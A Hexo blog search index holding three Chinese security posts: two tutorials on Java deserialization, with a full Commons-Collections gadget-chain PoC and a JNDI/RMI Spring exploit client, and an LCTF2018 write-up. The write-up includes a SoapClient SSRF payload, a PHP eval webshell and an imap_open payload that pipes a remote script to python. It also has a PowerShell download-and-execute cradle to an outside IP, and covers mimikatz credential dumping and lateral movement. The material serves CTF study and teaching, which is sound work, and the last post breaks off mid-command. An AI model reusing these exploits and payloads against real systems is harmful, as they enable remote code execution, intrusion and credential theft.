<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[从零开始的JAVA反序列化(二)]]></title>
    <url>%2Fjava_unserialize2.html</url>
    <content type="text"><![CDATA[从JAVA反射概念谈起JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。举一个例子1234567package com.xdsec;public class Member &#123; public void show(String s)&#123; System.out.println("hello " + s); &#125;&#125; 123456789101112131415161718192021222324package com.xdsec;import java.lang.reflect.Method;public class Testm &#123; public static void main(String[] args) throws Exception &#123; //1.获取Class对象 Class stuClass = Class.forName("com.xdsec.Member"); //2.获取所有公有方法 System.out.println("获取所有公有方法"); stuClass.getMethods(); Method[] methodArray = stuClass.getMethods(); for (Method m : methodArray) &#123; System.out.println(m); &#125; //通过反射调用Student下的show方法 Method m = stuClass.getMethod("show", String.class); System.out.println(m); //实例化一个Student对象 Object obj = stuClass.getConstructor().newInstance(); m.invoke(obj, "xdsec"); &#125;&#125; 从上面代码能看出m = stuClass.getMethod(“show”, String.class);//调用制定方法（所有包括私有的），需要传入两个参数，第一个是调用的方法名称，第二个是方法的形参类型，切记是类型（因为这里是字符串所以是string.class，同理如果是int就是int.class）。System.out.println(m);这里要注意一个小trick如果方法是private限定的，可以通过1m.setAccessible(true); 来解除私有限定Object result = m.invoke(obj, “xdsec”);//需要两个参数，一个是要调用的对象（获取有反射），一个是实参 Apache-Commons-Collections反序列化漏洞有了上面的知识我们来看一下Apache-Commons-Collections反序列化漏洞漏洞环境直接通过Maven搭建，Commons-Collections版本低于3.2.1即可pom.xml1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.xdsec&lt;/groupId&gt; &lt;artifactId&gt;commons&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 这个漏洞主要是由TransformedMap这个类是用来对Map进行某些变换用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理。 decorate函数是将一个普通的Map转换为一个TransformedMap。第二个参数和第三个参数分别对应当key改变和value改变时需要做的操作；Transformer是一个接口，用来实现传入的接口的transform(Object input)，如果修改了Map中的任意key或value，都会调用对应接口的transform方法去进行一些变换操作。 如果想要进行一系列的变换操作，可以通过定义一个ChainedTransformer接口来实现，只需要传入一个Transformer数组即可：1234567Transformer[] transformers = new Transformer[] &#123;new ConstantTransformer(...),new InvokerTransformer(...)&#125;;Transformer chainedTransformer = new ChainedTransformer(transformers);Map transMap = TransformedMap.decorate(rawMap, null, chainedTransformer); CommonsCollections已经内置了许多常见的transformer，无需手工编写，我们主要关心一下我们需要利用到的ConstantTransformer和InvokerTransformerConstantTransformertransform会返回传入的类在Java中执行命令一般通过Runtime.getRuntime().exec(“command”)来执行命令，如果我们想在修改transformedMap时执行命令，就需要构造一个特殊的ChainedTransformer来反射出exec函数，（首先通过ConstantTransformer获得）我们来看一下ChainedTransformer.class中的transform方法https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/java/Snipaste_2018-12-21_21-50-29.png可以看到这个transform会将上一次的返回结果作为下一次的输入，相当于一个非严格意义上的递归。调用ChainedTransformer的transform方法是挨个调用Transformer数组里对象的transform方法。所以第一步就是获取Runtime类的getRuntime方法12Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), InvokerTransformer接下来就是通过InvokerTransformer来反射调用exec方法，参数是\cmd``，以此来获取到Runtime.getRuntime().exec()。InvokerTransformer接受三个参数，分别是调用方法的名称，参数类型，调用参数。所以第一个参数就应当为exec；而exec方法的签名为exec(String, Class…)，我们实际用的时候也只传入了一个String，所以第二个参数应当写为new Class[] {String.class}，第三个参数则为调用exec时候实际传入的参数，所以应当为new Object[] {“cmd”}就可以了至此chain已经是这样的12345678Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"curl localhost:7999"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 然而Runtime实例化对象是不允许序列化的，所以不能直接传入实例化的对象，所以需要在transforms这个列表逐个反射回调的时候进行实例化所以我们可以构造如下payload1((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;) 12345678Transformer[] transformers = new Transformer[] &#123;new ConstantTransformer(Runtime.class),new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125;),new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open -a Calculator"&#125;)&#125;;Transformer transformChain = new ChainedTransformer(transformers); 当运行如下代码即可弹出计算器12345678910// 创建普通的MapMap normalMap = new HashMap();normalMap.put("xdsec", "web");// 将普通的Map变成TransformedMap，并且指定变换方式为前面定义的恶意chainMap transformMap = TransformedMap.decorate(normalMap, transformChain, transformChain);// 尝试修改TransformedMap中的一个值，成功执行命令Map.Entry entry = (Map.Entry) transformMap.entrySet().iterator().next();entry.setValue("test"); OK，现在我们已经获得了一个完整的poc，剩下的是找到一个可以进行重写了readObject方法的类并且调用了对map键值对修改操作，ysoserial中用的是BadAttributeValueExpException,我们先来看一下这个类的代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package javax.management;import java.io.IOException;import java.io.ObjectInputStream;public class BadAttributeValueExpException extends Exception &#123;/* Serial version */private static final long serialVersionUID = -3105272988410493376L;/** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */private Object val;/** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */public BadAttributeValueExpException (Object val) &#123;this.val = val == null ? null : val.toString();&#125;/** * Returns the string representing the object. */public String toString() &#123;return "BadAttributeValueException: " + val;&#125;private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get("val", null);if (valObj == null) &#123;val = null;&#125; else if (valObj instanceof String) &#123;val= valObj;&#125; else if (System.getSecurityManager() == null|| valObj instanceof Long|| valObj instanceof Integer|| valObj instanceof Float|| valObj instanceof Double|| valObj instanceof Byte|| valObj instanceof Short|| valObj instanceof Boolean) &#123;val = valObj.toString();&#125; else &#123; // the serialized object is from a version without JDK-8019292 fixval = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();&#125;&#125;&#125; 注意这里重写了readObject方法，如果我们传入的valObj为map类型，则会调用该map对象的tostring()方法,这看似不能对map键值进行修改，然而在java中存在一个TiedMapEntry类,该类的作用是将一个map对象与一个key进行绑定，他有一个toString()方法123public String toString() &#123; return this.getKey() + "=" + this.getValue(); &#125; 他会调用getValue()方法，我们再来看一下getValue()方法123public Object getValue() &#123; return this.map.get(this.key);&#125; 他会调用一个map对象的get方法，按理说调用一个map对象的get方法并不会修改键值对，也就不会产生这个问题，但是java中还有一个类叫做LazyMap，我们来看看他的get方法https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/java/Snipaste_2018-12-21_21-50-55.png也就是说他会尝试访问key的value如果key存在就返回value，key如果不存在就会把值put进去。那么ok，我们修改键值对的操作产生了，至此exp打通了。我们再来理一理过程123创建一个lazyMap对象map1，并通过decorate方法设transfomer时的transformChain通过TiedMapEntry创建一个将map1与一个不存在的key进行绑定的对象map2创建一个BadAttributeValueExpException对象map3，并将map2赋值给map3的val 要注意这里BadAttributeValueExpException中的val是私有属性，我们不能直接通过map3.val=map2进行赋值，需要通过上文我提到过的一种方法赋值1234BadAttributeValueExpException exception = new BadAttributeValueExpException(null);Field valField = exception.getClass().getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(exception, entry); 完整poc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class POC &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open -a Calculator"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // val是私有变量，所以利用下面方法进行赋值 Field valfield = poc.getClass().getDeclaredField("val"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File("poc.txt"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream("poc.txt"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); &#125;&#125; 参考链接https://www.freebuf.com/vuls/175252.htmlhttps://p0sec.net/index.php/archives/121/]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始的JAVA反序列化(一)]]></title>
    <url>%2Fjava_unserialize1.html</url>
    <content type="text"><![CDATA[从一则代码谈谈什么是java反序列化123456789101112131415161718192021222324package com.xdsec;import java.io.*;public class test &#123; public static void main(String args[])throws Exception&#123; //定义str字符串 String str="hello world!"; //创建一个包含对象进行反序列化信息的数据文件 FileOutputStream fos=new FileOutputStream("pupiles"); ObjectOutputStream os=new ObjectOutputStream(fos); //writeObject()方法将obj对象写入object文件 os.writeObject(str); os.close(); //反序列化str对象 FileInputStream fis=new FileInputStream("pupiles"); ObjectInputStream ois=new ObjectInputStream(fis); //获得对象 String str2=(String)ois.readObject(); System.out.print(str2); ois.close(); &#125;&#125; 我们可以通过os.writeObject将我们的str对象写入文件中，接着，通过os.readObject将我们的对象从序列化文件中恢复。那我们先来看看写入的文件长什么样记住这里文件的前五个字节aced0005是java序列化文件的文件头。看到这里肯定有很多同学有疑问，为什么要用复杂的反序列化，的确，在单一程序代码中使用序列化确实是很麻烦，但是如果在处理跨平台的数据传输和对对象和类的传输的时候却是非常重要的手段。 第二段代码1234567891011121314151617181920212223242526272829303132333435package com.xdsec;import java.io.*;public class test2&#123; public static void main(String args[]) throws Exception&#123; //定义myObj对象 MyObject myObj = new MyObject(); myObj.name = "pupiles"; //创建一个包含对象进行反序列化信息的”object”数据文件 FileOutputStream fos = new FileOutputStream("pupiles2"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将myObj对象写入object文件 os.writeObject(myObj); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream("pupiles2"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 MyObject objectFromDisk = (MyObject)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class MyObject implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //打开计算器程序命令 Runtime.getRuntime().exec("open /Applications/Calculator.app/"); &#125;&#125; 这次我们自己写了一个classMyObject。我们看到，MyObject类有一个公有属性name，myObj实例化后将myObj.name赋值为了“pupiles”，然后序列化写入文件pupiles2，然后反序列化这里弹出计算器的原因是我们重写了MyObject的readObject方法(注意这里MyObject需要实现Serializable的接口，否则该类无法进行序列化)123456private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //打开计算器程序命令 Runtime.getRuntime().exec("open /Applications/Calculator.app/"); &#125; 所以当main函数调用反序列化的readObject方法的时候会打开计算器 反序列化与RMI和JDNI之间的小故事很多同学会说怎么可能会有人这么写代码呢，当然不会，我们接下来继续看先来介绍一下RMI和JDNIRMI123RMI是Remote Method Invoke的缩写，是JDK提供的一个完善的、简单易用的远程调用框架，它要求客户端和服务器端都是Java程序。下面简述RMI的基本原理：如下图所示，RMI采用代理来负责客户端和服务器之间socket通信的细节。RMI框架分别为远程对象生成了客户端代理和服务器端代理，位于客户端的代理称为存根（Stub），位于服务器端的代理称为骨架（Skeleton）。远程对象会在客户端生成存根对象。当客户端调用远程对象的方法时，实际上是调用本地存根的相应方法。然后，存根会把被访问的远程对象名、方法名以及参数编组后发送给服务器，由骨架去调用相应的远程方法并把返回值或异常返回给客户端。 创建一个RMI程序的基本步骤：（1）创建远程接口，继承java.rmi.Remote接口；（2）创建远程类，实现远程接口；（3）创建服务器程序，在rmiregistry注册表中注册远程对象；（4）创建客户端程序，负责定位远程对象，并且调用远程方法。rmiServer.java12345678package main; import java.rmi.Remote;import java.rmi.RemoteException;// 实现Remote接口public interface rmiServer extends Remote &#123; public String service(String data) throws RemoteException;&#125; rmiServerImpl.java123456789101112131415161718192021package main; import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class rmiServiceImpl extends UnicastRemoteObject implements HelloService &#123; private static final long serialVersionUID = 1L; private String name; public rmiServiceImpl(String name) throws RemoteException &#123; super(); this.name = name; &#125; @Override public String service(String data) throws RemoteException &#123; return data + name; &#125;&#125; Server.java12345678910111213141516171819202122232425262728package main; import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry; import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException; public class Server &#123; public static void main(String[] args) &#123; try &#123; LocateRegistry.createRegistry(1099); HelloService service1 = new HelloServiceImpl("service1"); Context namingContext = new InitialContext(); namingContext.rebind("rmi://localhost:1099/HelloService1", service1); &#125; catch (RemoteException | NamingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println("Successfully register a remote object."); &#125;&#125; client.java12345678910111213141516171819202122232425package main; import java.rmi.RemoteException; import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException; public class Client &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub String url = "rmi://localhost:1099/"; try &#123; Context namingContext = new InitialContext(); HelloService serv = (HelloService) namingContext.lookup( url + "HelloService1"); String data = "This is RMI Client."; System.out.println(serv.service(data)); &#125; catch (NamingException | RemoteException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 简单来说就是客户端会通过lookup函数去调用远程服务端的方法，并返回执行结果。那说到这里可能有的同学就要说如果在目标服务器上存在lookup函数并且参数可控的话，我们就可以恶意注册一个rmi服务器去供其调用，实现RCE。其实并不是如此，我们来看一下rmi的执行过程 rmi服务注册他的名字和IP到RMI注册中心（bind） rmi客户端通过IP和名字去RMI注册中心找相应的服务（lookup） rmi Stub序列化调用的方法和参数编组后传给rmi Skeleton(call) rmi skeleton执行stub的逆过程，调用真实的server类执行该方法（invocation） rmi skeleton将调用函数的结果返回给stub（return） 所以真正执行该函数是在远程服务端，执行完成后会将结果序列化返回给应用端，客户端是不执行代码的，这点一定要搞清楚。我们继续来看看JDNI1JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。在 Java 中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP 和 RMI 等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。为了更好的理解整个 JNDI 注入产生的原因，下面用实际代码来说明一下常规 RMI 访问和使用 JNDI 访问 RMI 的区别。 12345678910111213141516171819202122232425package com.xdsec;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class jdniServer &#123; public static void main(String args[]) throws Exception &#123; // 配置 JNDI 默认设置 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory"); env.put(Context.PROVIDER_URL, "rmi://localhost:1099"); Context ctx = new InitialContext(env); // 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象 Registry registry = LocateRegistry.createRegistry(1099); rmiServerImpl service2 = new rmiServerImpl("service2"); registry.bind("hello", service2); System.out.println("jdni server start..."); &#125;&#125; 12345678910111213141516171819202122232425package com.xdsec;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class jdniClient &#123; public static void main(String[] args) throws Exception &#123; // 配置 JNDI 默认设置 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory"); env.put(Context.PROVIDER_URL, "rmi://localhost:1099"); Context ctx = new InitialContext(env); // JNDI 获取 RMI 上的方法对象并进行调用 rmiServer rHello = (rmiServer) ctx.lookup("hello"); String data = "This is jdni Client."; System.out.println(rHello.service(data)); &#125;&#125; 页面回显了 看上去没什么问题，但是如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。如以下代码123Reference refObj = new Reference("ClassName", "ClassName", "http://example.com:2333/");ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);registry.bind("refObj", refObjWrapper); 当有客户端通过 lookup(“refObj”) 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 ClassName 的类，如果本地未找到，则会去请求 http://example.com:2333ClassName.class 动态加载 classes 并调用 ClassName 的构造函数。讲到这里，攻击方法也就浮出水面了，如果refObj参数可控，我们即可rce。当然这里还是有同学会说，正常的程序猿不会让lookup函数的参数给用户可控吧，的确事实确实如此，所以我们接着看。 spring rce下面我们来看一个实例2016年的Spring框架的反序列化漏洞Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理。server代码如下12345678910111213141516171819202122232425public class ExploitableServer &#123; public static void main(String[] args) &#123; &#123; //创建socket ServerSocket serverSocket = new ServerSocket(Integer.parseInt("9999")); System.out.println("Server started on port "+serverSocket.getLocalPort()); while(true) &#123; //等待链接 Socket socket=serverSocket.accept(); System.out.println("Connection received from "+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; //读取对象 Object object = objectInputStream.readObject(); System.out.println("Read object "+object); &#125; catch(Exception e) &#123; System.out.println("Exception caught while reading object"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; client代码如下123456789101112131415161718192021222324252627282930313233343536373839public class ExploitClient &#123; public static void main(String[] args) &#123; try &#123; String serverAddress = args[0]; int port = Integer.parseInt(args[1]); String localAddress= args[2]; //启动web server，提供远程下载要调用类的接口 System.out.println("Starting HTTP server"); HttpServer httpServer = HttpServer.create(new InetSocketAddress(8088), 0); httpServer.createContext("/",new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); //下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class System.out.println("Creating RMI Registry"); Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://"+serverAddress+"/"); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference); registry.bind("Object", referenceWrapper); System.out.println("Connecting to server "+serverAddress+":"+port); Socket socket=new Socket(serverAddress,port); System.out.println("Connected to server"); //jndi的调用地址 String jndiAddress = "rmi://"+localAddress+":1099/Object"; org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager(); object.setUserTransactionName(jndiAddress); //发送payload System.out.println("Sending object to server..."); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); while(true) &#123; Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 这里向Server发送的Payload是：12345// jndi的调用地址String jndiAddress = "rmi://127.0.0.1:1999/Object";// 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量JtaTransactionManager object = new JtaTransactionManager();object.setUserTransactionName(jndiAddress); 之前我们说过，反序列化时会调用被序列化类的readObject()方法，readObject()可以重写而实现一些其他的功能，我们看一下JtaTransactionManager类的readObject()方法：1234567891011private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; // Rely on default serialization; just initialize state after deserialization. ois.defaultReadObject(); // Create template for client-side JNDI lookup. this.jndiTemplate = new JndiTemplate(); // Perform a fresh lookup for JTA handles. initUserTransactionAndTransactionManager(); initTransactionSynchronizationRegistry(); &#125; initUserTransactionAndTransactionManager()是用来初始化UserTransaction以及TransactionManager12345678protected void initUserTransactionAndTransactionManager() throws TransactionSystemException&#123; if(this.userTransaction == null)&#123; //Fetch JTA UserTransaction from JDNI, if necessary. if(StringUtils.haslength(this.userTransactionName); this.userTransaction = lookupUserTransaction(this.userTransactionName)); &#125; *** lookupUserTransaction()方法会调用JndiTemplate的lookup()1234pubic &lt;T&gt; T lookup(String name,Class&lt;T&gt; requiredType) throws NamingException&#123; Object jndiObject = lookup(name); &#125;*** 由于Reference reference = new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http://127.0.0.1:8000/&quot;);存在Reference类，所以会自动下载该类并执行该类的构造方法。未完待续 参考链接 https://www.freebuf.com/vuls/115849.htmlhttps://www.vulbox.com/knowledge/detail/?id=11https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈LCTF2018]]></title>
    <url>%2Flctf2018.html</url>
    <content type="text"><![CDATA[主题 —新生想了很久，最终决定把今年的主题定为新生。这其实有很多方面的意义首先是协会层面，在经历过2016年的动荡之后，协会经历了整整一年的重建期，大家都为协会的维系疲惫不堪，当时的想法是没有技术我们还可以再学，但是没有协会那就真的什么都没了，于是大家都在为协会的维系而不停奔波。而今年，我们协会基本上环境趋于稳定了，剩下的就是学习技术。其次是做题人层面，还记得上一届LCTF我负责运维的时候，做题的师傅的ip都是那么熟悉，一直是那么几个老赛棍，而今年再运维的时候发现好多老师傅都已经退役或者半退役了，而很多新生代的师傅则是扛起了战队的大旗，不得不感慨各大战队都是后继有人啊。最后是出题层面，几年的web题我们也是别有心思准备了一些比较贴近实战又创新的几个点，比如travel的ssrf打腾讯云实例信息加X-HTTP-Method-Override头绕过nginx PUT请求，以及talk 1s ch34p后面的java-xxe上传文件(虽然师傅们都没发现),domain-pentest的域渗透题,EZ OAuth的ssrf+MIMT等，希望大家能学到新的知识。 LCTF的前世与今身体——–不知不绝，LCTF已经举办了第三届了，我的大学也已经过去三年了还记得首届LCTF的时候，那一年也是协会环境也是最乱的时候，各类矛盾压身，好在学长们都很给力，虽付出了很大的代价(失去赞助商和实验室等等)，期间也是遇到各种ddos问题,但还是坚持把LCTF办了下去。那一年，主题是改变第二届LCTF的时候，老一辈学长大部分都出去实习了，重担到了Klaus他们身上，但是学长们依旧给力，拉到了稳定的金主爸爸(长亭),解决了实验室的问题，协会又有了一个稳定的环境。那一年，主题是稳定第三届LCTF的时候，也就是LCTF2018，klaus他们也出去实习了，重担到了我们头上，由于金主爸爸今年让我们自己运维平台，所以我们临时决定写一个平台出来，时间很紧，但是fish师傅和盘神都很给力，我们的新平台最终还是诞生了(也就是大家所使用的平台)。今年，主题是新生。 “消逝”的L与”新生”的7不知道大家有没有好奇过为什么L在今年一年的ctf比赛里都没有出现过23333。还记得年初的时候当我们准备从学长手里继任L-Team的时候都一致觉得自己太菜了，不能给L-Team丢脸，于是思来想去决定先采用了L的倒置–7这个队名参加各类CTF比赛，等以后我们觉得自己可以不丢L-Team的脸的时候再换回来。一开始确实如我们料想的那般，打啥比赛都没有很好的成绩，但幸运的是大家都没有放弃，于是随着时间的积累吧，又或许是老赛棍师傅大部分退役的缘故，慢慢的我们的成绩有了也许起色，也可以在一些大型比赛中争得一席之地，而在上周结束的HCTF2018中，更是取得了前所未有的好成绩。 两个web出题心得babyphp’s revenge代码如下index.php123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);?&gt; flag.php1session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF&#123;*************************&#125;'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123; $_SESSION['flag'] = $flag; &#125; hint:反序列化这题是我出给XCTF Final的bestphp的第二版，搭建看到flag.php的内容也能猜出来是ssrf。大体思路也是session_start支持一个数组参数，可以覆盖php.ini中的部分session相关变量，而session中有个叫做serialize_handler的参数可以控制session的解析引擎，所以可以借用由解析引擎的不同导致的session反序列化，构造soap类ssrf，获取flag但是这里有个问题就是如何进行ssrf构造，众所周知soap的ssrf需要调用_call方法，但是这里如何触发呢，我们回到call_user_func这里可以发现我们可以直接使用call_user_func执行对象中的方法，由于我们只需要构造出一个soap类的对象就可以执行welcome_to_the_lctf2018的方法，因为这个方法不存在，所以我们相当于调用了_call方法12345678$target='http://127.0.0.1/flag.php';$b = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; "AAA:BBB\r\n" . "Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912", 'uri' =&gt; "http://127.0.0.1/"));$se = serialize($b); echo urlencode($se); 里主要思路是通过php session引擎的不同，导致自动反序列化soap内置类，最终ssrf读到flag !()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/3FFB2A23BA3AF86034D45C718554A964.jpg) god of domain-pentest writeup前排先感谢各位师傅的手下留情，让我们的运维压力少了不少压力。整个域环境其实挺难搭的，尤其是搭在腾讯云上，由于腾讯云只支持windowsserver虚拟机，以及本地管理员用户登录，导致我无法在172.21.0.8上登录域用户，所以大家也无法抓到域用户的密码，所以只好把域用户写到题目描述中了。 拓扑 入口首先代码如下123456 &lt;?phphighlight_file(__FILE__);$lshell=$_GET['lshell'];eval($lshell);var_dump($lshell);NULL 解法一入口很简洁，一上来就给了你一个一句话木马，但是看一下phpinfo会发现我限制了严格的disable_function和open_basedir这里首先我们最终目的是bypass open_basedir，查看任意目录的文件，但是常用的方法我都禁止了，所以解决问题还得回到bypass disable_function,这里丢一个最新的bypass方式1https://github.com/Bo0oM/PHP_imap_open_exploit 可以通过这个payload反弹shell1%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5CtY3VybCB2cHMucHVwaWxlcy5jb218cHl0aG9u%7Cbase64%5Ct-d%7Csh%7D%22%3B%0Aimap_open(%27%7B%27.%24server.%27%3A143%2Fimap%7DINBOX%27%2C%20%27%27%2C%20%27%27)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B /var/www/ew.txt这里提供了10个socks5 端口代理，供各位师傅代理进内网， 解法二nmap直接扫，发现1080-1090端口开放是代理端口，直接链接 解法三ROIS的师傅构造了一个一句话版的regork，膜地址https://github.com/zsxsoft/reGeorg 子域-PC这里有两种方式可以getshell proxychains4 代理一下nmap扫内网，发现172.21.0.8开放了80端口，访问一看是个内网的phpstudy，那就可以用默认密码root，root登录phpmyadmin，修改general log为ON，general log file为C:\phpStudy/PHPTutorial/WWW/xxxx.php可以getshell ms17-010直接打 getshell后打开cmd使用cobaltstrike的payload!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-52-09.png]1powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://139.199.27.197:8000/aaa&apos;))&quot; 在shell上执行，可以得到回弹的shell查看下权限是本地管理员权限，那么可以直接用mimikatz抓取密码!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-55-47.png]根据题目描述，域用户为web.lctf.com\buguake,密码为xdsec@lctf2018 子域-域控通过1ipconfig /all 可以得到子域域控的ip地址1172.21.0.7 收集域控信息1nltest 